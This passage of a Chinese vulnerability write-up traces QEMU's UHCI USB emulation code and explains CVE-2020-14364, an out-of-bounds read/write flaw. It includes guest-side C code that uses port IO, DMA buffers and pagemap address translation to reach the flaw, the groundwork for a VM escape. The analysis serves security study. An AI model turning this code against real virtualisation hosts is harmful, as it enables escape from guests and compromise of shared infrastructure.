info-&gt;device_id;    k-&gt;revision  = info-&gt;revision;    if (!info-&gt;unplug) &#123;        /* uhci controllers in companion setups can&#x27;t be hotplugged */        dc-&gt;hotpluggable = false;        device_class_set_props(dc, uhci_properties_companion);    &#125; else &#123;        device_class_set_props(dc, uhci_properties_standalone);    &#125;    if (info-&gt;notuser) &#123;        dc-&gt;user_creatable = false;    &#125;    u-&gt;info = *info;&#125;\n该函数初始化PCI设备的一些基本信息，然后k-&gt;realize函数将在设备进行实例化时被调用，其中usb_uhci_common_realize函数如下\nvoid usb_uhci_common_realize(PCIDevice *dev, Error **errp)&#123;    Error *err = NULL;    PCIDeviceClass *pc = PCI_DEVICE_GET_CLASS(dev);    UHCIPCIDeviceClass *u = container_of(pc, UHCIPCIDeviceClass, parent_class);    UHCIState *s = UHCI(dev);    uint8_t *pci_conf = s-&gt;dev.config;    int i;    pci_conf[PCI_CLASS_PROG] = 0x00;    /* TODO: reset value should be 0. */    pci_conf[USB_SBRN] = USB_RELEASE_1; /* release number */    pci_config_set_interrupt_pin(pci_conf, u-&gt;info.irq_pin + 1);    s-&gt;irq = pci_allocate_irq(dev);    if (s-&gt;masterbus) &#123;        USBPort *ports[NB_PORTS];        for(i = 0; i &lt; NB_PORTS; i++) &#123;            ports[i] = &amp;s-&gt;ports[i].port;        &#125;        usb_register_companion(s-&gt;masterbus, ports, NB_PORTS,                               s-&gt;firstport, s, &amp;uhci_port_ops,                               USB_SPEED_MASK_LOW | USB_SPEED_MASK_FULL,                               &amp;err);        if (err) &#123;            error_propagate(errp, err);            return;        &#125;    &#125; else &#123;        usb_bus_new(&amp;s-&gt;bus, sizeof(s-&gt;bus), &amp;uhci_bus_ops, DEVICE(dev));        for (i = 0; i &lt; NB_PORTS; i++) &#123;            usb_register_port(&amp;s-&gt;bus, &amp;s-&gt;ports[i].port, s, i, &amp;uhci_port_ops,                              USB_SPEED_MASK_LOW | USB_SPEED_MASK_FULL);        &#125;    &#125;    s-&gt;bh = qemu_bh_new(uhci_bh, s);    s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, uhci_frame_timer, s);    s-&gt;num_ports_vmstate = NB_PORTS;    QTAILQ_INIT(&amp;s-&gt;queues);    memory_region_init_io(&amp;s-&gt;io_bar, OBJECT(s), &amp;uhci_ioport_ops, s,                          &quot;uhci&quot;, 0x20);    /* Use region 4 for consistency with real hardware.  BSD guests seem       to rely on this.  */    pci_register_bar(&amp;s-&gt;dev, 4, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;io_bar);&#125;\n其中s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, uhci_frame_timer, s);注册了一个定时任务，memory_region_init_io(&amp;s-&gt;io_bar, OBJECT(s), &amp;uhci_ioport_ops, s,&quot;uhci&quot;, 0x20);注册了一个IO端口，其大小为0x20字节，通过pci_register_bar(&amp;s-&gt;dev, 4, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;io_bar);注册设备BAR，其下标为4。IO操作注册表uhci_ioport_ops\nstatic const MemoryRegionOps uhci_ioport_ops = &#123;    .read  = uhci_port_read,    .write = uhci_port_write,    .valid.min_access_size = 1,    .valid.max_access_size = 4,    .impl.min_access_size = 2,    .impl.max_access_size = 2,    .endianness = DEVICE_LITTLE_ENDIAN,&#125;;\n有两个操作，read和write，分别可以使用out和in指令来进行触发。其中uhci_port_read读取当前设备的一些状态，addr的值是使用IO时传入的地址相对于该设备基址IO的偏移\nstatic uint64_t uhci_port_read(void *opaque, hwaddr addr, unsigned size)&#123;    UHCIState *s = opaque;    uint32_t val;    switch(addr) &#123;    case 0x00:        val = s-&gt;cmd;        break;    case 0x02:        val = s-&gt;status;        break;    case 0x04:        val = s-&gt;intr;        break;    case 0x06:        val = s-&gt;frnum;        break;    case 0x08:        val = s-&gt;fl_base_addr &amp; 0xffff;        break;    case 0x0a:        val = (s-&gt;fl_base_addr &gt;&gt; 16) &amp; 0xffff;        break;    case 0x0c:        val = s-&gt;sof_timing;        break;    case 0x10 ... 0x1f:        &#123;            UHCIPort *port;            int n;            n = (addr &gt;&gt; 1) &amp; 7;            if (n &gt;= NB_PORTS)                goto read_default;            port = &amp;s-&gt;ports[n];            val = port-&gt;ctrl;        &#125;        break;    default:    read_default:        val = 0xff7f; /* disabled port */        break;    &#125;    trace_usb_uhci_mmio_readw(addr, val);    return val;&#125;\n同理uhci_port_write向设备写入一些数据\nstatic void uhci_port_write(void *opaque, hwaddr addr,                            uint64_t val, unsigned size)&#123;    UHCIState *s = opaque;    trace_usb_uhci_mmio_writew(addr, val);    switch(addr) &#123;    case 0x00:        if ((val &amp; UHCI_CMD_RS) &amp;&amp; !(s-&gt;cmd &amp; UHCI_CMD_RS)) &#123;            /* start frame processing */            trace_usb_uhci_schedule_start();            s-&gt;expire_time = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) +                (NANOSECONDS_PER_SECOND / FRAME_TIMER_FREQ);            timer_mod(s-&gt;frame_timer, s-&gt;expire_time);            s-&gt;status &amp;= ~UHCI_STS_HCHALTED;        &#125; else if (!(val &amp; UHCI_CMD_RS)) &#123;            s-&gt;status |= UHCI_STS_HCHALTED;        &#125;        if (val &amp; UHCI_CMD_GRESET) &#123;            UHCIPort *port;            int i;            /* send reset on the USB bus */            for(i = 0; i &lt; NB_PORTS; i++) &#123;                port = &amp;s-&gt;ports[i];                usb_device_reset(port-&gt;port.dev);            &#125;            uhci_reset(DEVICE(s));            return;        &#125;        if (val &amp; UHCI_CMD_HCRESET) &#123;            uhci_reset(DEVICE(s));            return;        &#125;        s-&gt;cmd = val;        if (val &amp; UHCI_CMD_EGSM) &#123;            if ((s-&gt;ports[0].ctrl &amp; UHCI_PORT_RD) ||                (s-&gt;ports[1].ctrl &amp; UHCI_PORT_RD)) &#123;                uhci_resume(s);            &#125;        &#125;        break;    case 0x02:        s-&gt;status &amp;= ~val;        /* XXX: the chip spec is not coherent, so we add a hidden           register to distinguish between IOC and SPD */        if (val &amp; UHCI_STS_USBINT)            s-&gt;status2 = 0;        uhci_update_irq(s);        break;    case 0x04:        s-&gt;intr = val;        uhci_update_irq(s);        break;    case 0x06:        if (s-&gt;status &amp; UHCI_STS_HCHALTED)            s-&gt;frnum = val &amp; 0x7ff;        break;    case 0x08:        s-&gt;fl_base_addr &amp;= 0xffff0000;        s-&gt;fl_base_addr |= val &amp; ~0xfff;        break;    case 0x0a:        s-&gt;fl_base_addr &amp;= 0x0000ffff;        s-&gt;fl_base_addr |= (val &lt;&lt; 16);        break;    case 0x0c:        s-&gt;sof_timing = val &amp; 0xff;        break;    case 0x10 ... 0x1f:        &#123;            UHCIPort *port;            USBDevice *dev;            int n;            n = (addr &gt;&gt; 1) &amp; 7;            if (n &gt;= NB_PORTS)                return;            port = &amp;s-&gt;ports[n];            dev = port-&gt;port.dev;            if (dev &amp;&amp; dev-&gt;attached) &#123;                /* port reset */                if ( (val &amp; UHCI_PORT_RESET) &amp;&amp;                     !(port-&gt;ctrl &amp; UHCI_PORT_RESET) ) &#123;                    usb_device_reset(dev);                &#125;            &#125;            port-&gt;ctrl &amp;= UHCI_PORT_READ_ONLY;            /* enabled may only be set if a device is connected */            if (!(port-&gt;ctrl &amp; UHCI_PORT_CCS)) &#123;                val &amp;= ~UHCI_PORT_EN;            &#125;            port-&gt;ctrl |= (val &amp; ~UHCI_PORT_READ_ONLY);            /* some bits are reset when a &#x27;1&#x27; is written to them */            port-&gt;ctrl &amp;= ~(val &amp; UHCI_PORT_WRITE_CLEAR);        &#125;        break;    &#125;&#125;\n其中看到case 0x00时如果条件满足，会将计时器时间设为时间到，这样会触发之前注册的定时任务函数uhci_frame_timer\nstatic void uhci_frame_timer(void *opaque)&#123;    UHCIState *s = opaque;........    for (i = 0; i &lt; frames; i++) &#123;        s-&gt;frame_bytes = 0;        trace_usb_uhci_frame_start(s-&gt;frnum);        uhci_async_validate_begin(s);        uhci_process_frame(s);        uhci_async_validate_end(s);        /* The spec says frnum is the frame currently being processed, and         * the guest must look at frnum - 1 on interrupt, so inc frnum now */        s-&gt;frnum = (s-&gt;frnum + 1) &amp; 0x7ff;        s-&gt;expire_time += frame_t;    &#125;.........&#125;\n在该函数中，会调用uhci_process_frame函数处理当前累计需要传送的帧的数据，uhci_process_frame函数如下\nstatic void uhci_process_frame(UHCIState *s)&#123;    uint32_t frame_addr, link, old_td_ctrl, val, int_mask;    uint32_t curr_qh, td_count = 0;    int cnt, ret;    UHCI_TD td;    UHCI_QH qh;    QhDb qhdb;    frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);    pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4);    le32_to_cpus(&amp;link);.........        /* TD */        uhci_read_td(s, &amp;td, link);        trace_usb_uhci_td_load(curr_qh &amp; ~0xf, link &amp; ~0xf, td.ctrl, td.token);        old_td_ctrl = td.ctrl;        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);..........&#125;\n这里从物理地址处先读入一个地址link，然后将link当作物理地址，从中读取一个td结构体\ntypedef struct UHCI_TD &#123;    uint32_t link;    uint32_t ctrl; /* see TD_CTRL_xxx */    uint32_t token;    uint32_t buffer;&#125; UHCI_TD;static void uhci_read_td(UHCIState *s, UHCI_TD *td, uint32_t link)&#123;    pci_dma_read(&amp;s-&gt;dev, link &amp; ~0xf, td, sizeof(*td));    le32_to_cpus(&amp;td-&gt;link);    le32_to_cpus(&amp;td-&gt;ctrl);    le32_to_cpus(&amp;td-&gt;token);    le32_to_cpus(&amp;td-&gt;buffer);&#125;\n然后td结构体会被传入uhci_handle_td函数\nstatic int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)&#123;    int ret, max_len;    bool spd;    bool queuing = (q != NULL);    uint8_t pid = td-&gt;token &amp; 0xff;    UHCIAsync *async;..........    /* Is active ? */    if (!(td-&gt;ctrl &amp; TD_CTRL_ACTIVE)) &#123;        if (async) &#123;            /* Guest marked a pending td non-active, cancel the queue */            uhci_queue_free(async-&gt;queue, &quot;pending td non-active&quot;);        &#125;        /*         * ehci11d spec page 22: &quot;Even if the Active bit in the TD is already         * cleared when the TD is fetched ... an IOC interrupt is generated&quot;         */        if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;                *int_mask |= 0x01;        &#125;        return TD_RESULT_NEXT_QH;    &#125;    switch (pid) &#123;    case USB_TOKEN_OUT:    case USB_TOKEN_SETUP:    case USB_TOKEN_IN:        break;    default:        /* invalid pid : frame interrupted */        s-&gt;status |= UHCI_STS_HCPERR;        s-&gt;cmd &amp;= ~UHCI_CMD_RS;        uhci_update_irq(s);        return TD_RESULT_STOP_FRAME;    &#125;.............    switch(pid) &#123;    case USB_TOKEN_OUT:    case USB_TOKEN_SETUP:        pci_dma_read(&amp;s-&gt;dev, td-&gt;buffer, async-&gt;buf, max_len);        usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);        if (async-&gt;packet.status == USB_RET_SUCCESS) &#123;            async-&gt;packet.actual_length = max_len;        &#125;        break;    case USB_TOKEN_IN:        usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);        break;    default:        abort(); /* Never to execute */    &#125;    if (async-&gt;packet.status == USB_RET_ASYNC) &#123;        uhci_async_link(async);        if (!queuing) &#123;            uhci_queue_fill(q, td);        &#125;        return TD_RESULT_ASYNC_START;    &#125;.......&#125;\nuhci_handle_td会根据传入的td结构体里对应的td-&gt;token，做出相应的动作，如果是USB_TOKEN_IN或者USB_TOKEN_OUT、USB_TOKEN_SETUP的话，会调用usb_handle_packet函数,然后usb_handle_packet会调用usb_process_one函数，最终完成对USB设备的数据读取。从整个流程下来看，要进入最终的数据交换函数，我们构造如下的代码\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)#define UHCI_BASE 0xc040#define UHCI_CMD_HCRESET (1 &lt;&lt; 1)#define UHCI_CMD_RS (1 &lt;&lt; 0)#define UHCI_PORT_RESET (1 &lt;&lt; 9)#define UHCI_PORT_EN    (1 &lt;&lt; 2)    //enable#define UHCI_PORT_CCS   (1 &lt;&lt; 0)#define TD_CTRL_ACTIVE  (1 &lt;&lt; 23)typedef struct UHCI_TD &#123;    uint32_t link;    uint32_t ctrl; /* see TD_CTRL_xxx */    uint32_t token;    uint32_t buffer;&#125; UHCI_TD;struct UHCI_TD * td;uint32_t *td_phy_addr_in_any_frame;char *dmabuf;unsigned char *data_buf;char *setup_buf;void die(char *msg) &#123;   perror(msg);   exit(-1);&#125;/*向设备写入数据*/void pmio_write(uint32_t addr,uint32_t val) &#123;   outl(val,UHCI_BASE + addr);&#125;/*从UHCI读取数据*/uint32_t pmio_read(uint32_t addr) &#123;   return (uint32_t)inl(UHCI_BASE + addr);&#125;//虚拟地址转换为物理地址size_t get_phys_addr(void *vir_addr) &#123;   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/   if (fd == -1) &#123;      die(&quot;open pagemap error&quot;);   &#125;   size_t vir = (size_t)vir_addr;   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移   size_t offset = vir / 0x1000 * 8;   if (lseek(fd,offset,SEEK_SET) == -1) &#123;      die(&quot;lseek pagemap error&quot;);   &#125;   size_t addr;   if (read(fd,&amp;addr,8) != 8) &#123;      die(&quot;read pagemap error&quot;);   &#125;   addr = (addr &amp; PFN_MASK) * 0x1000 + vir % 0x1000;   return addr;&#125;void init() &#123;    /* 映射一块dmabufs 也就是dma模式的读写，读写的数据都在这块内存上*/    dmabuf = mmap(0, 0x6000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (dmabuf == MAP_FAILED)        die(&quot;mmap&quot;);    /* 上锁，防止被调度 */    mlock(dmabuf, 0x6000);    td = (UHCI_TD *)dmabuf;    td_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);    setup_buf = dmabuf + 0x300;    data_buf = dmabuf + 0x1000;&#125;void set_UHCIState() &#123;    //清空UHCI之前的状态，这样我们在下一次就可以触发定时任务了    pmio_write(0,UHCI_CMD_HCRESET);    //初始化USB端口    for(int i=0x10;i &lt;= 0x1f;i++)        pmio_write(i, UHCI_PORT_CCS | UHCI_PORT_RESET | UHCI_PORT_EN);    uint32_t td_phy_addr = get_phys_addr(td);    *td_phy_addr_in_any_frame = td_phy_addr;    //pmio_write(6, 0); //设置s-&gt;frnum为0    pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址    pmio_write(0, UHCI_CMD_RS);    sleep(1);&#125;int main() &#123;   init();   //申请IO权限   iopl(3);   set_UHCIState();&#125;\n在set_UHCIState中，第一行pmio_write(0,UHCI_CMD_HCRESET)首先清空UHCI的状态，这样最后一行的pmio_write(0, UHCI_CMD_RS)就可以触发进入uhci_process_frame函数，第二行要先将所有的USB端口状态重置，并且使能。这因为在uhci_handle_td函数中会调用uhci_find_device函数去查找已挂载的USB设备\nstatic int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)&#123;...................   /* Allocate new packet */    if (q == NULL) &#123;        USBDevice *dev;        USBEndpoint *ep;        dev = uhci_find_device(s, (td-&gt;token &gt;&gt; 8) &amp; 0x7f);        if (dev == NULL) &#123;            return uhci_handle_td_error(s, td, td_addr, USB_RET_NODEV,                                        int_mask);        &#125;        ep = usb_ep_get(dev, pid, (td-&gt;token &gt;&gt; 15) &amp; 0xf);        q = uhci_queue_new(s, qh_addr, td, ep);    &#125;....................\n而uhci_find_device函数如下\nstatic USBDevice *uhci_find_device(UHCIState *s, uint8_t addr)&#123;    USBDevice *dev;    int i;    for (i = 0; i &lt; NB_PORTS; i++) &#123;        UHCIPort *port = &amp;s-&gt;ports[i];        if (!(port-&gt;ctrl &amp; UHCI_PORT_EN)) &#123;            continue;        &#125;        dev = usb_find_device(&amp;port-&gt;port, addr);        if (dev != NULL) &#123;            return dev;        &#125;    &#125;    return NULL;&#125;\n需要有UHCI_PORT_EN使能标志，否则uhci_find_device将返回NULL。那么返回上一个函数时，将进入uhci_handle_td_error函数uhci_handle_td_error函数如下\nstatic int uhci_handle_td_error(UHCIState *s, UHCI_TD *td, uint32_t td_addr,                                int status, uint32_t *int_mask)&#123;.....................    td-&gt;ctrl &amp;= ~TD_CTRL_ACTIVE;    s-&gt;status |= UHCI_STS_USBERR;    if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;        *int_mask |= 0x01;    &#125;    uhci_update_irq(s);    return ret;&#125;\n该函数会将td-&gt;ctrl中的TD_CTRL_ACTIVE标志清除掉，并且在返回到uhci_process_frame函数时，由于td-&gt;ctrl发生变化，将会通过DMA的方式将变化后的内容重新写回到我们传入到数据中。\nstatic void uhci_process_frame(UHCIState *s)&#123;...............        old_td_ctrl = td.ctrl;        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);        if (old_td_ctrl != td.ctrl) &#123;            /* update the status bits of the TD */            val = cpu_to_le32(td.ctrl);            pci_dma_write(&amp;s-&gt;dev, (link &amp; ~0xf) + 4, &amp;val, sizeof(val));        &#125;..............\n\n这将导致下一次进入uhci_handle_td函数时，不满足条件而直接返回。\nstatic int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)&#123;..........    /* Is active ? */    if (!(td-&gt;ctrl &amp; TD_CTRL_ACTIVE)) &#123;        if (async) &#123;            /* Guest marked a pending td non-active, cancel the queue */            uhci_queue_free(async-&gt;queue, &quot;pending td non-active&quot;);        &#125;        /*         * ehci11d spec page 22: &quot;Even if the Active bit in the TD is already         * cleared when the TD is fetched ... an IOC interrupt is generated&quot;         */        if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;                *int_mask |= 0x01;        &#125;        return TD_RESULT_NEXT_QH;    &#125;\n因此USB端口的初始化是必要的。接下来，由于frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);，因此s-&gt;fl_base_addr必须设置，而s-&gt;frnum是一个递增的变量，代表当前的frame\nstatic void uhci_frame_timer(void *opaque)&#123;.............    for (i = 0; i &lt; frames; i++) &#123;        s-&gt;frame_bytes = 0;        trace_usb_uhci_frame_start(s-&gt;frnum);        uhci_async_validate_begin(s);        uhci_process_frame(s);        uhci_async_validate_end(s);        /* The spec says frnum is the frame currently being processed, and         * the guest must look at frnum - 1 on interrupt, so inc frnum now */        s-&gt;frnum = (s-&gt;frnum + 1) &amp; 0x7ff;        s-&gt;expire_time += frame_t;    &#125;...........&#125;static void uhci_process_frame(UHCIState *s)&#123;    uint32_t frame_addr, link, old_td_ctrl, val, int_mask;    uint32_t curr_qh, td_count = 0;    int cnt, ret;    UHCI_TD td;    UHCI_QH qh;    QhDb qhdb;    frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);    pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4);....................        /* TD */        uhci_read_td(s, &amp;td, link);        trace_usb_uhci_td_load(curr_qh &amp; ~0xf, link &amp; ~0xf, td.ctrl, td.token);        old_td_ctrl = td.ctrl;        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);.............\n且s-&gt;frnum的值是从0到0x7ff递增的，只要我们在任何一个s-&gt;frnum对应的位置即frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2)处布置下一个数据，这个数据将被读入到link变量中pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4)。在这里我们选择了dmabuf + 0x100的位置，同时s-&gt;fl_base_addr也设置为了td的物理地址。并且由于我们的td就位于dmabuf的开头\ntd_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);uint32_t td_phy_addr = get_phys_addr(td);*td_phy_addr_in_any_frame = td_phy_addr;pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址\n那么当((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2 == 0x100，即0x40时，pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4)读取到的就是dmabuf + 0x100，即读取到了td的物理地址。于是uhci_read_td(s, &amp;td, link);从这个物理地址处取出出了td的结构体，然后传递给uhci_handle_td进行处理。\n0x04 USB数据包处理漏洞（CVE-2020-14364）在上述的操作后，我们只需要设置好td结构体里对应的内容，就可以进行USB的读写操作了。usb_handle_packet函数处理一个USB数据包，位于源文件hw/usb/core.c\n/* Hand over a packet to a device for processing.  p-&gt;status ==   USB_RET_ASYNC indicates the processing isn&#x27;t finished yet, the   driver will call usb_packet_complete() when done processing it. */void usb_handle_packet(USBDevice *dev, USBPacket *p)&#123;    if (dev == NULL) &#123;        p-&gt;status = USB_RET_NODEV;        return;    &#125;    assert(dev == p-&gt;ep-&gt;dev);    assert(dev-&gt;state == USB_STATE_DEFAULT);    usb_packet_check_state(p, USB_PACKET_SETUP);    assert(p-&gt;ep != NULL);    /* Submitting a new packet clears halt */    if (p-&gt;ep-&gt;halted) &#123;        assert(QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue));        p-&gt;ep-&gt;halted = false;    &#125;    if (QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue) || p-&gt;ep-&gt;pipeline || p-&gt;stream) &#123;        usb_process_one(p);        if (p-&gt;status == USB_RET_ASYNC) &#123;            /* hcd drivers cannot handle async for isoc */            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_ISOC);            /* using async for interrupt packets breaks migration */            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_INT ||                   (dev-&gt;flags &amp; (1 &lt;&lt; USB_DEV_FLAG_IS_HOST)));            usb_packet_set_state(p, USB_PACKET_ASYNC);            QTAILQ_INSERT_TAIL(&amp;p-&gt;ep-&gt;queue, p, queue);        &#125; else if (p-&gt;status == USB_RET_ADD_TO_QUEUE) &#123;            usb_queue_one(p);        &#125; else &#123;            /*             * When pipelining is enabled usb-devices must always return async,             * otherwise packets can complete out of order!             */            assert(p-&gt;stream || !p-&gt;ep-&gt;pipeline ||                   QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue));            if (p-&gt;status != USB_RET_NAK) &#123;                usb_pcap_data(p, false);                usb_packet_set_state(p, USB_PACKET_COMPLETE);            &#125;        &#125;    &#125; else &#123;        usb_queue_one(p);    &#125;&#125;\n其主要调用了usb_process_one\nstatic void usb_process_one(USBPacket *p)&#123;    USBDevice *dev = p-&gt;ep-&gt;dev;    bool nak;    /*     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it     * can be USB_RET_NAK here from a previous usb_process_one() call,     * or USB_RET_ASYNC from going through usb_queue_one().     */    nak = (p-&gt;status == USB_RET_NAK);    p-&gt;status = USB_RET_SUCCESS;    if (p-&gt;ep-&gt;nr == 0) &#123;        /* control pipe */        if (p-&gt;parameter) &#123;            do_parameter(dev, p);            return;        &#125;        switch (p-&gt;pid) &#123;        case USB_TOKEN_SETUP:            do_token_setup(dev, p);            break;        case USB_TOKEN_IN:            do_token_in(dev, p);            break;        case USB_TOKEN_OUT:            do_token_out(dev, p);            break;        default:            p-&gt;status = USB_RET_STALL;        &#125;    &#125; else &#123;        /* data pipe */        if (!nak) &#123;            usb_pcap_data(p, true);        &#125;        usb_device_handle_data(dev, p);    &#125;&#125;\n其中注意到do_token_setup函数\nstatic void do_token_setup(USBDevice *s, USBPacket *p)&#123;    int request, value, index;    if (p-&gt;iov.size != 8) &#123;        p-&gt;status = USB_RET_STALL;        return;    &#125;    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);    s-&gt;setup_index = 0;    p-&gt;actual_length = 0;    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;        fprintf(stderr,                &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\\n&quot;,                s-&gt;setup_len, sizeof(s-&gt;data_buf));        p-&gt;status = USB_RET_STALL;        return;    &#125;..............\n在检查出s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)时，虽然报错并且返回，当并没有将s-&gt;setup_len的值给清除，只要不对USB端口进行重置，这个值将一直保留，那么，这个s-&gt;setup_len我们是可以控制为任意大小的。那么在do_token_in函数进行数据读取时，\nstatic void do_token_in(USBDevice *s, USBPacket *p)&#123;    int request, value, index;    assert(p-&gt;ep-&gt;nr == 0);    request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];    value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];    index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];    switch(s-&gt;setup_state) &#123;    case SETUP_STATE_ACK:        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;            usb_device_handle_control(s, p, request, value, index,                                      s-&gt;setup_len, s-&gt;data_buf);            if (p-&gt;status == USB_RET_ASYNC) &#123;                return;            &#125;            s-&gt;setup_state = SETUP_STATE_IDLE;            p-&gt;actual_length = 0;        &#125;        break;    case SETUP_STATE_DATA:        if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123;            int len = s-&gt;setup_len - s-&gt;setup_index;            if (len &gt; p-&gt;iov.size) &#123;                len = p-&gt;iov.size;            &#125;            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);            s-&gt;setup_index += len;            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;                s-&gt;setup_state = SETUP_STATE_ACK;            &#125;            return;        &#125;        s-&gt;setup_state = SETUP_STATE_IDLE;        p-&gt;status = USB_RET_STALL;        break;    default:        p-&gt;status = USB_RET_STALL;    &#125;&#125;\n其中看到\ns-&gt;setup_index += len;if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;    s-&gt;setup_state = SETUP_STATE_ACK;&#125;\n每一次s-&gt;setup_index累加上len，然后判断s-&gt;setup_index是否超过s-&gt;setup_len，由于s-&gt;setup_len可以被我们控制，因此s-&gt;setup_index也可以被我们控制。那么usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);便可以进行越界读取，同理在do_token_out函数中进行写数据时，可以越界写。\nstatic void do_token_out(USBDevice *s, USBPacket *p)&#123;    assert(p-&gt;ep-&gt;nr == 0);    switch(s-&gt;setup_state) &#123;    case SETUP_STATE_ACK:        if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123;            s-&gt;setup_state = SETUP_STATE_IDLE;            /* transfer OK */        &#125; else &#123;            /* ignore additional output */        &#125;        break;    case SETUP_STATE_DATA:        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;            int len = s-&gt;setup_len - s-&gt;setup_index;            if (len &gt; p-&gt;iov.size) &#123;                len = p-&gt;iov.size;            &#125;            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);            s-&gt;setup_index += len;            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;                s-&gt;setup_state = SETUP_STATE_ACK;            &#125;            return;        &#125;        s-&gt;setup_state = SETUP_STATE_IDLE;        p-&gt;status = USB_RET_STALL;        break;..........................\n这就是CVE-2020-14364其中len是有范围的\nstatic int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)&#123;..............   max_len = ((td-&gt;token &gt;&gt; 21) + 1) &amp; 0x7ff;    spd = (pid == USB_TOKEN_IN &amp;&amp; (td-&gt;ctrl &amp; TD_CTRL_SPD) != 0);    usb_packet_setup(&amp;async-&gt;packet, pid, q-&gt;ep, 0, td_addr, spd,                     (td-&gt;ctrl &amp; TD_CTRL_IOC) != 0);    if (max_len &lt;= sizeof(async-&gt;static_buf)) &#123;        async-&gt;buf = async-&gt;static_buf;    &#125; else &#123;        async-&gt;buf = g_malloc(max_len);    &#125;    usb_packet_addbuf(&amp;async-&gt;packet, async-&gt;buf, max_len);    switch(pid) &#123;    case USB_TOKEN_OUT:    case USB_TOKEN_SETUP:        pci_dma_read(&amp;s-&gt;dev, td-&gt;buffer, async-&gt;buf, max_len);        usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);        if (async-&gt;packet.status == USB_RET_SUCCESS) &#123;            async-&gt;packet.actual_length = max_len;        &#125;.............\n即UHCI协议一次性最多传输0x7ff个字节。思考如何利用这个漏洞，查看USBDevice结构\n/* definition of a USB device */struct USBDevice &#123;    DeviceState qdev;    USBPort *port;    char *port_path;    char *serial;    void *opaque;    uint32_t flags;    /* Actual connected speed */    int speed;    /* Supported speeds, not in info because it may be variable (hostdevs) */    int speedmask;    uint8_t addr;    char product_desc[32];    int auto_attach;    bool attached;    int32_t state;    uint8_t setup_buf[8];    uint8_t data_buf[4096];    int32_t remote_wakeup;    int32_t setup_state;    int32_t setup_len;    int32_t setup_index;    USBEndpoint ep_ctl;    USBEndpoint ep_in[USB_MAX_ENDPOINTS];    USBEndpoint ep_out[USB_MAX_ENDPOINTS];    QLIST_HEAD(, USBDescString) strings;    const USBDesc *usb_desc; /* Overrides class usb_desc if not 